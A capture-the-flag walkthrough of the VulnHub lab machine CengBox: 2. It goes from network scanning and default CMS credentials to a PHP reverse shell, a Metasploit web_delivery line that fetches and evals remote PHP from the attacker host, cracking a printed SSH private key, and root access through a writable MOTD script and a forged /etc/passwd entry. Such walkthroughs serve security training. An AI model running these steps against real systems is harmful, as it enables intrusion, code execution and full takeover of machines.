# CengBox: 2: Vulnhub Walkthrough

Today we are going to crack this vulnerable machine called CengBox: 2. It is created by **Arslan Bilecen.** This is a Capture the Flag type of challenge. It contains two flags that are accessible after gaining a limited session and a root level privilege on the machine. It is an Intermediate level machine.

### Penetration Testing Methodology

**Network Scanning**- Netdiscover
- Nmap

**Enumeration**- Enumerating the FTP login
- Browsing the HTTP service on port 80
- Directory Bruteforce using gobuster
- Enumerating Credentials for Gila CMS
- Enumerating Gila CMS

**Exploitation**- Exploiting Command Injection

**Post-Exploitation**- Enumerating for Sudo Permissions
- Crafting a PHP payload using Msfvenom
- Enumerating the SSH keys
- Cracking the SSH password using John The Ripper
- Logging the SSH session as Mitnick user
- Downloading and Enumerating using pspy64s script
- Exploring permissions on Motd files
- Adding nano command to the Motd header file

**Privilege Escalation**- Relogging as Mitnick user
- Creating a new user using openssl
- Editing the /etc/password and adding a new user
- Getting root access from new user

**Getting the Root Flag**

### Walkthrough

### Network Scanning

To attack any machine, we need to find the IP Address of the machine. This can be done using the netdiscover command. To find the IP Address, we will need to co-relate the MAC Address of the machine that can be obtained from the Virtual Machine Configuration Setting. The IP Address of the machine was found to be **192.168.1.104.**


Currently scanning: 192.168.10.0/16   |   Screen View: Unique Hosts
11 Captured ARP Req/Rep packets, from 10 hosts.   Total size: 660
---------------------------------------------------------------------------------
IP              At MAC Address      Count     Len   MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.1.1     --:--:--:--:--:--       1      60   TP-LINK TECHNOLOGIES CO., LTD
192.168.1.103   --:--:--:--:--:--       1      60   Dell Inc.
192.168.1.104   --:--:--:--:--:--       1      60   PCS Systemtechnik GmbH
192.168.1.101   --:--:--:--:--:--       1      60   OnePlus Technology (Shenzhen)
192.168.1.107   --:--:--:--:--:--       1      60   Samsung Electronics Co., Ltd
192.168.1.105   --:--:--:--:--:--       1      60   Apple, Inc.
192.168.1.108   --:--:--:--:--:--       2     120   Intel Corporate


Following the netdiscover scan, we need a nmap scan to get the information about the services running on the virtual machine. An aggressive nmap scan reveals that 3 services: FTP (21), SSH (22) and HTTP (80) are running on the application.

nmap -A 192.168.1.104


root@kali:~# nmap -A 192.168.1.104
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:39 EDT
Nmap scan report for ceng-company.vm (192.168.1.104)
Host is up (0.00046s latency) ingarticles.in
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  fto     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0                      209 May 23 07:21 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|       Connected to ::ffff:192.168.1.112
|       Logged in as ftp
|       TYPE: ASCII
|       No session bandwidth limit
|       Session timeout in seconds is 300
|       Control connection is plain text
|       Data connections will be plain text
|       At session startup, client count was 2
|       vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:99:9d:e0:bc:07:3c:4f:53:e5:bc:27:35:80:e4:9e (RSA)
|   256 fe:60:a1:10:90:98:8e:b0:82:02:3b:40:bc:df:66:f1 (ECDSA)
|_  256 3а:c3:a0:e7:bd:20:ca:1e:71:d4:3c:12:23:af:6a:c3 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site Maintenance
MAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms ceng-company.vm (192.168.1.104)


### Enumeration

It was quite clear from the nmap scan that the FTP service has Anonymous Login Enabled by default and there is a file located in it as well named note.txt. As this is one of the ports that is basically open for access, let’s take a look into it. After logging in as Anonymous, we download the note.txt to our local machine to take a look at it. Here we see it is a note which consists of 2 names. Note them they can be useful down the road. Also, we see that the application is moved to a domain ceng-company.vm. That means we need to configure our /etc/hosts file. We also take note that if we find any CMS on the application then the default credentials can work as the note suggests so.

ftp 192.168.1.104
Anonymous
ls
get note.txt
bye
cat note.txt


root@kali:~# ftp 192.168.1.104
Connected to 192.168.1.104.
220 (vsFTPd 3.0.3)
Name (192.168.1.104:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              209 May 23 07:21 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (209 bytes).
226 Transfer complete.
209 bytes received in 0.00 secs (176.8644 kB/s)
ftp> bye    www.hackingarticles.in
root@kali:~# cat note.txt
Hey Kevin,
I just set up your panel and used default password. Please change them before any hack.

I try to move site to new domain which name is ceng-company.vm and also I created a new area for you.

Aaron
root@kali:-#


To access the application, we make the appropriate changes in the /etc/hosts file.


root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.104   ceng-company.vm


Now that we have made changes in the /etc/hosts file and there was an http service running on the application, we can check the application on our Web browser.

http://ceng-company.vm

We have the Site Maintenance banner. This means that we need to enumerate further for the proper application. It is possible that the CMS is hidden in one of the directories.


ceng-company.vm

Site Maintenance
Sorry, We don't serve yet. You can check later the site. Regards
- Ceng Company Team


#### Directory Bruteforce using gobuster

After using dirb for Directory Bruteforcing, we were unable to find any relevant webpages. Then it hit us that what if Aaron from the note meant subdomain. That means we need to perform a directory bruteforce on the subdomain. To do this gobuster is the best tool. It has a vhost option with the subdomains dictionary.

gobuster vhost -u http://ceng-company.vm/ -w subdomains-top1mil-5000.txt

After going on for some time, gobuster gave us the admin subdomain on the ceng-company.vm. But as it can be observed that it is forbidden i.e. 403. We need to bypass this restriction as well.


root@kali:~# gobuster vhost -u http://ceng-company.vm/ -w subdomains-top1mil-5000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://ceng-company.vm/
[+] Threads:      10
[+] Wordlist:     subdomains-top1mil-5000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/06/02 16:11:03 Starting gobuster
===============================================================
Found: admin.ceng-company.vm (Status: 403) [Size: 296]
Found: m..ceng-company.vm (Status: 400) [size: 422]
Found: ns2.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]
Found: ns1.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]
Found: ns2.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]
Found: ns3.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]
Found: jordan.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]
Found: ferrari.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]
Found: quatro.oweb.com..ceng-company.vm (Status: 400) [Size: 422]
===============================================================
2020/06/02 16:11:04 Finished
===============================================================


Let’s make an entry in the /etc/hosts/ file for the admin subdomain.


root@kali:~# cat /etc/hosts
127.0.0.1       Localhost
127.0.1.1       kali
192.168.1.104   ceng-company.vm
192.168.1.104   admin.ceng-company.vm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~#


Let’s try to access the URL again on the Web Browser. It can be observed that the link is still forbidden. We need to enumerate further for a possible entry point.


admin.ceng-company.vm

Forbidden
You don't have permission to access / on this server.
Apache/2.4.18 (Ubuntu) Server at admin.ceng-company.vm Port 80


This is where we decided it is time to do another directory bruteforce. This time, we thought to use the OWASP DirBuster. It gave us some directories. One of them was “gila”. It looks interesting.


#### Enumerating Credentials for Gila CMS

We decided to browse the gila directory and we have ourselves a CMS page at last. Wow! That took some time. This made us realise that finding an entry point on the application is as important as exploiting it. Also trusting a single tool is not ideal. We should expand our arsenal of tools and dictionary.

http://admin.ceng-company.vm/gila/


© admin.ceng-company.vm/gila/
Gila CMS
An awesome website!
Home   About

Hello World
This is the first post


We checked the Gila CMS Documentations for the location of the admin login panel. It was “mysite.com/admin” and after a thorough the read of the documentation on Gila CMS which can be found **here**. There was nothing about the default password. Also, the login panel asks for an email means we will have to find some email address as well. There were two users that we learnt from the note that we found on the FTP server. It was Kevin and Aaron. Also, Kevin is the one whose account was setup by Aaron.

We need to obtain the email address of Kevin. Since ceng-company.vm was the primary domain. We decided to smack both of them together and get the email id as “kevin@ceng-company.vm”. It was total guesswork at this moment. We tried multiple passwords like “password”, “1234”, “gila”. Nothing worked. Then, just as we were about to attempt bruteforce. It came to us to try “admin” as password and Voila! It worked.

Email: kevin@ceng-company.vm
Password: admin

#### Enumerating Gila CMS

As we read the documentation earlier, we knew that the Gila provides a File Manager in its Dashboard. It can help in uploading a payload to generate the session on the virtual machine. But instead of uploading, we decided to edit the already consisting files on the virtual machine as they will have the proper permissions. We used the pentest monkey’s PHP Reverse shell and made the specific changes in it to point our local attacking machine i.e., Kali Linux.


admin.ceng-company.vm/gila/admin/fm?f=./config.php


Now, after editing the config file, we started a netcat listener on the port that we specified in the payload. In this case, it was port 1234. After starting the listener, we execute the payload by browsing the payload in the web browser. When we come back to the terminal, we find that a new session is generated but the said session is a limited shell. To upgrade this limited shell into a TTY shell, use the python one-liner.

### Post Exploitation

After getting the shell as a part of post-exploitation, we ran the sudo -l command to find the list of binaries that can be run using sudo. We found that there is a script named runphp.sh that can be run using swartz user. We ran the script and **got ourselves a php shell. **

sudo -l sudo -u swartz /home/swartz/runphp.sh


root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.1.112] from ceng-company.vm [192.168.1.104] 43400
Linux cengbox 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86
 10:26:09 up 52 min, 0 users,   load average: 0.00, 0.00, 0.00
USER    TTY    FROM           LOGIN@  IDLE       PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cengbox:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on cengbox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bi
User www-date may run the following commands on cengbox:
    (swartz) NOPASSWD: /home/swartz/runphp.sh
www-data@cengbox:/$ sudo -u swartz /home/swartz/runphp.sh
sudo -u swartz /home/swartz/runphp.sh
Interactive mode enabled

No entry for terminal type "unknown";
using dumb terminal settings.
php >


So, we need a php shell script to get the session. For this, we went back to our local machine and ran the Metasploit Framework. The web_delivery exploit was our choice. After setting the lhost and lport settings appropriately, we were able to obtain a PHP script that allowed us to access the target machine’s meterpreter session. We made a copy of the script.

use exploit/multi/script/web_delivery
set target 1
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.112
set lport 8888
exploit


msf5 › use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 1
target → 1
msf5 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload → php/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lhost 192.168.1.112
lhost → 192.168.1.112
msf5 exploit(multi/script/web_delivery) > set lport 8888
lport → 8888
msf5 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.1.112:8888
[*] Using URL: http://0.0.0.0:8080/UKllE3psr6oVNxR
[*] Local IP: http://192.168.1.112:8080/UKllE3psr6oVNxR
[*] Server started.
msf5 exploit(multi/script/web_delivery) > [*] Run the following command on the target machine:
php -d allow_url_fopen=true -r eval(file_get_contents(http://192.168.1.112:8080/UKllE3psr6oVNxR', false,


We pasted the script in the php shell that we got ourselves earlier as shown in the image given below.


php >
eer'→false, 'verify_peer_name'→false]])));

                                        eval(file_get_contents('http://192.168.1
.112:8080/UKllE3psr6oVNxR', false, stream_context_create(['ssl'→['verify_peer'=
›false,'verify peer name'→false]])):


#### Enumerating the SSH keys

After running the script, we went back to the terminal with Metasploit. We have ourselves a meterpreter session. We enumerate the home directory to find a user named Mitnick. It might be important. We traverse into the Mitnick user directory to find a user.txt file and .ssh directory. We tried to read the user.txt but we were unable to. Then we decided that logging as the Mitnick user is the only way to read that user.txt flag. And from the looks of it, it seems that we will have to SSH into Mitnick user. We get into the ssh directory and we have the public keys which can be used to SSH into Mitnick user.

cd /home
ls
cd mitnick
cat user.txt
cd .ssh
ls


meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40750/rwxr-x---   4096   dir   2020-05-25 16:56:28 -0400  mitnick
40755/rwxr-xr-x   4096   dir   2020-05-26 08:05:13 -0400  swartz

meterpreter > cd mitnick
meterpreter > ls
Listing: /home/mitnick
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  1      fil   2020-05-26 10:17:57 -0400  .bash_history
100644/rw-r--r--  220    fil   2020-05-23 06:57:19 -0400  .bash_logout
100644/rW-r--r--  3771   fil   2020-05-23 06:57:19 -0400  .bashrc
40700/rwx------   4096   dir   2020-05-23 07:01:01 -0400  .cache
100600/rw-------  505    fil   2020-05-23 09:21:59 -0400  .mysql_history
100600/rw-------  655    fil   2020-05-26 10:18:18 -0400  .php_history
100644/rw-r--r--  655    fil   2020-05-23 06:57:19 -0400  .profile
40750/rwxr-x---   4096   dir   2020-05-25 17:08:16 -0400  .ssh
100600/rw-------  1      fil   2020-05-26 10:17:52 -0400  .viminfo
100600/rw-------  33     fil   2020-05-23 16:31:16 -0400  user.txt

meterpreter > cat user.txt
[-] core_channel_open: Operation failed: 1
meterpreter > cd .ssh
meterpreter > ls
Listing: /home/mitnick/.ssh
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  397    fil   2020-05-25 17:08:40 -0400  authorized_keys
100644/rw-r--r--  1766   fil   2020-05-25 17:07:49 -0400  id_rsa
100644/rw-r--r--  397    fil   2020-05-25 17:07:49 -0400  id_rsa.pub


We verify that the public key is, in fact, the keys for the Mitnick user by reading it. On our local system, we copy the SSH key and insert it into a file called “key”.

cat id_rsa.pub
cat id_rsa


meterpreter > cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAАBАQDNVdрNkwaМZd144QРIIfwdogeTS/Хm7еRUI+1C2Zj+RfØ26ТIv0М1INk/lpfЕfс8MrМ3Ro2fSPvHkYxu3FtKUVxLHEsVq7VWaiugBbJmFzHAG6APgcZc4ebERbtp
0eVwoEC91Jl67KBqJGbnfr2mh3GUgdaDQF0wWrgtQV1Zrlh/KBe+T1mEeqLsoFs6K12yYlf07UdcrhvxNZhpBeYt30CoAj8+UAx7zKV2rdQkh0RlZtKebHHNwr0+5FfwarpKrDj9js5rN3glv mitnick@cengbox
meterpreter > cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4, ENCRYPTED
DEK-Info: AES-128-CBC, 21425CA12E394F02C77645793C350D91

j0zfhmCwJQ8eqkzxuAgaXxy8Nh0AL1NR2dXz0tZVbSRRKdUcAeXQFkNYdAH+InjR
mg0FUtcz6915iomrBHd71ZnK4iQMVcZZ37r8fAQppvZVGhKbf5DGmnyDZiTxGtdv
06kEQOXOAVUce+bMDEgChMEdORmk2yisizjDi9IMttWQ3VMyaHoyRp2UOCjntZPC
KcpQMGjWJEos3ZrlIrfX/FSkfT0QkwdzkigeJsC7zH0AioH55tdfAY8d33AJuSQ0
71725qMfn7tfNd8n642xFGnRV2YMCY108XB0f50J267T4doagB985ZNDtqJdxkoF
KXLqdvs1KJzCAMu9m0m4UV7ZR7qmYKiFXnEkL/hE913CF9S6U0jKKRZq26TpJVj4
a4WJ+yauszPVI9KlnB7X9g5cd3Xoe04ROWbaVhx0tv3ipjcbGOPcuQudiMH8P0rj
pXI0YD/nDSV9gCqfgi0wJTag8LK+4ZUENHu3Thuku0NCGZpkdJg/UETu9m8Cl8CR
pa4khXbI+1J7frvqUFq+op3CBT4GccKUbD4B/Sa2BLjs0V75A/tpffr2R0o8KxaL
HFHJUqwhTCk6qp5Hx6tQWtaUQ7gd0J1BMARts/x3rGpphdmSwqZqusdrw/KS3TbH
Vkjp05LABvEMGL2/HbB2fLEZk+fkJ3YNq78+IQSxNSDFPsAIMySFmro+tf9X7KWu
hna6795X13c+WdE5hEsK6X2b0kZhFln/6Rkz5BsWNlaBVQwYfthfepN+e4NwdtcT
e/NZt/Cppe+J74ABmC8FyKVr+sbnb2MWWwg2nQ9aPEcDinjWk7ALtJbwIG46Udb9
l/c8/RSot4rRA3ADHj5JZtEAnnrwCH07cc4yGLEJOneSPxz4yW8vSGDd7iAWjYuE
YOCDY6iH2cvi3rrVrfUZ1beHMcegRtsTgPj2tbd7x4FD6xY+Vha+Va/OV6F7kuE7
fgS5uJs/WqCVemQWKLfa22AMeCRn5qB9AT1gAGbH5oFlr0t0vvbpZsdiRSp86mx5
/Pzrio/5e0kZ1b4+PF1cU0zFJ0V0ADl8hGQxE9LYOozxKGdSEP1oJ0hThCGQVK8W
cQZ91RSt5tbQbh03T4r8wh0g0Fyf3N/jEJ2IBzFKDZAqn0oxUzQFcBnsYIMh029F
bTH6WyWaIy97HxSEzMmMUJo78n8uptNkglFPYp0LTzTEXsEYC6WxGBIihXOHEJ1J
1XxTCMoZFkZ2IpL9TmRtdWcqKBjiXLXuPjpMaIlg3tL8AEqR92stCPpyIVkfsxRf
j+FgaA97zTv8je+uGIAyv3fl3W69L0sMSTGwZutxngBsyhK3FbzF5r1c6c55jxXK
Tj+QuvPjLwGNT9KQ3XT40Ge5KSiSQ3ZhA4K1AhGyfCxhA2hdK7Y9RZVxKISCzjsY
40NeFNZKIhTIWITNcr4/ebGiQuyLy0QpTgP6kpiLDYcZlPdIjdBAEjF+5rVcuxfB
xtHilk7LLiLarD6lFaF4bYoB2lwW0ioUzvZYUjLIT7RyrDa6tnidXI9aVAWgLFor
xi3Ed0lgkxkFm6AFQ0Zq1R8MqI4+6apX4nqqV/ybGpBFwpjgI//mOlHf9kdxp0Pk
-----END RSA PRIVATE KEY-----
meterpreter >


We have a script that can convert the “key” into a crackable hash. It is called ssh2john. It is already in the Kali Linux in the /usr/share/ directory. Using the script we converted the “key” into “hash” file. Now that we have a hash, we used John the Ripper to crack it and discovered that the password is **legend**.

locate ssh2john
/usr/share/john/ssh2john.py key > hash
john –wordlist=/usr/share/wordlists/rockyou.txt hash


root@kali:~# locate ssh2john
/usr/share/john/ssh2john.py
root@kali:~# /usr/share/john/ssh2john.py key > hash
root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press " " or Ctrl-C abort, almost any other key for status
legend           (key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-06-02 13:37) 0.2040g/s 2926Kp/s 2926Kc/s 2926KC/sa6_123.. *7; Vamos!
Session completed
root@kali:~#


#### Downloading and Enumerating using pspy64s script

Time to SSH into Mitnick user. We had the username from the previous steps and the password we just cracked. After logging into the Mitnick user, we traversed into the /tmp directory and download the pspy64s script using wget command. We provide it proper permissions and execute it. It will help us enumerate pesky files or permission of different files across the system.

ssh -i key mitnick@192.168.1.104
cd /tmp
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
chmod 777 pspy64s
./pspy64s


root@kali:~# ssh -1 key mitnick@192.168.1.104
Enter passphrase for key "key':

* Documentation: https://help.ubuntu.com
* Management:    https://landscape.canonical.com
* Support:       https://ubuntu.com/advantage

177 packages can be updated.
130 updates are security updates. articles-in

Last login: Tue May 26 07:12:16 2020 from 192.168.0.14
To run a command as administrator (user "root"), use "sudo ‹command›".
See "man sudo_root" for details.

mitnick@cengbox:~$cd /tmp
mitnick@cengbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
--2020-06-02 10:39:04-- https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
Resolving github.com (github.com) ... 13.234.210.38
Connecting to github.com (github.com) |13.234.210.38|:443 ... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-production-release-asset-2e65be.s3.amazonaws.com/120821432/d54f2200-c51c-11e9.
X-Amz-Date=20200602T173904Z&X-Amz-Expires=3008X-Amz-Signature=ddadcb7ac6dc97174f3ec6b198d68794c6787e4c:
3Dpspy64s&response-content-type=application%2Foctet-stream [following]
--2020-06-02 10:39:04- https://github-production-release-asset-2e65be.s3.amazonaws.com/120821432/d54*
2Faws4_request&X-Amz-Date=20200602T173904Z&X-Amz-Expires=3008X-Amz-Signature=ddadcb7ac6dc97174f3ec6b191
%3B%20filename%3Dpspy64s&response-content-type=application%2Foctet-stream
Resolving github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e6!
Connecting to github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy64s'

pspy64s                                                  100%[=========================================

2020-06-02 10:39:10 (235 KB/s) - 'pspy64s' saved [1156536/1156536]

mitnick@cengbox:/tmp$ chmod 777 pspy64s
mitnick@cengbox:/tmp$ ./psp664s
-bash: ./psp664s: No such file or directory
mitnick@cengbox:/tmp$ ./pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


Here, we see that /etc/update-motd.d is running. MOTD is usually the Message of the Day messages. It seems interesting enough to take a look at.


PID=1946   /bin/sh -c /bin/cp /var/update-motd.d/* /etc/update-motd.d
PID=1945   |/usr/sbin/cron -f


We traverse into the directory to find in this directory all the files are writable. We tied to use edit one using the nano command.

cd /etc/update-motd.d/
ls -la
nano 00-header


mitnick@cengbox:/tmp$ cd /etc/update-motd.d/
mitnick@cengbox:/etc/update-motd.d$ ls -la
total 28
drwxr-xr-x  2 root root       4096 May 26 07:14 .
drwxr-xr-x 92 root root       4096 May 26 03:20 ..
-rwxrwxr-x  1 root developers 1119 Jun  2 10:45 00-header
-rwxrwxr-x  1 root developers 1157 Jun  2 10:45 10-help-text
-rwxrwxr-x  1 root developers   97 Jun  2 10:45 90-updates-available
-rwxrwxr-x  1 root developers  299 Jun  2 10:45 91-release-upgrade
-rwxrwxr-x  1 root developers  604 Jun  2 10:45 99-esm
mitnick@cengbox:/etc/update-motd.d$ nano 00-header


After taking a good look at the files, I found it clear that someone calls these files as root without sanitising the environment. While this is acceptable when processes such as sshd or Getty call it through login where the environment should be controlled, it becomes an issue if, for instance, an attacker modifies the PAM to add a temporary user. We added the permissions to nano command in this file.

chmod u+s /bin/nano


#! /bin/sh
#
#     00-header - create the header of the MOTD
#     Copyright (C) 2009-2010 Canonical Ltd.
#
#     Authors: Dustin Kirkland <kirklandacanonical.com>
#     This program is free software; you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation; either version 2 of the License, or
#     (at your option) any later version.
#
#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#     GNU General Public License for more details.
#
#     You should have received a copy of the GNU General Public License along
#     with this program; if not, write to the Free Software Foundation, Inc.,
#     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release
chmod u+s /bin/nano
if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi


### Privilege Escalation

Now that we have added the nano command in the motd, we need to logout from the ssh session and reconnect so that the motd executes. After logging again, we see that nano now have upgraded permissions. Let’s use this nano command to edit the /etc/passwd file and add our user with root privileges.

exit
ssh -i key mitnick@192.168.1.104
ls -la /bin/nano nano
/etc/passwd


mitnick@cengbox:/etc/update-motd.d$ exit
Logout
Connection to 192.168.1.104 closed.
root@kali: # ssh -i key mitnick@192.168.1.104
Enter passphrase for key "key': 

 * Documentation:   https://help.ubuntu.com
 * Management:      https://landscape.canonical.com
 * Support:         https://ubuntu.com/advantage

177 packages can be updated.
130 updates are security updates.

New release '18.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Jun 2 10:38:44 2020 from 192.168.1.112
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

mitnick@cengbox:~$ ls -la /bin/nano
-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano
mitnick@cengbox:~$nano /etc/passwd


We opened up a new terminal on our local machine and created a set of credentials for the new user.

openssl passwd -1 -salt user3 pass123


root@kali:~# openssl passwd -1 -salt user3 pass123
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
root@kali:~#


Back to the SSH session on the target machine, we add the line with the username raj and with root-level privileges.


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
Lp: x:7:7:tp:/var/spool/Lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33: www-data:/var/ww:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/List:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats::41:41:Gnats Bug-Reporting System admin):/var/lib/gnats:/usr/sbin/nologin
nobody: x:65534: 65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,.:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104: systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105: systemd Bus Proxy,..:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/Lib/Lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
insmasq:x:110:65534:dnsmasg:/var/Lib/misc:/bin/fals
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologi
mitnick:x:1000:1002:mitnick,,,:/home/mitnick:/b1n/bash
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/bin/false
swartz:x:1001:1002::/home/swartz:
raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash


Let’s save and exit the nano editor. To check if the entries are saved, we use the tail command. Let just login to raj user using su command and we are root. We can find the root flag in the /root directory.

tail -n 3 /etc/passwd
su raj
cd /root
cat root.txt


mitnick@cengbox:~$ tail -n 3 /etc/passwd
rtp:x:112:119:ftp daemon,,,:/srv/ftp:/bin/false
swartz:x:1001:1002:: /home/swartz:
raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash
mitnick@cengbox: su raj
Password:
root@cengbox:/home/mitnick# cd /root
root@cengbox:~# ls
root.txt
root@cengbox:~# cat root.txt
CEngBox2
I would be grateful for your any feedback. Feel free to contact me on Twitter @arslanblon_

de89782fe4e8bf2198a022ae7f50613e
root@cengbox:~#
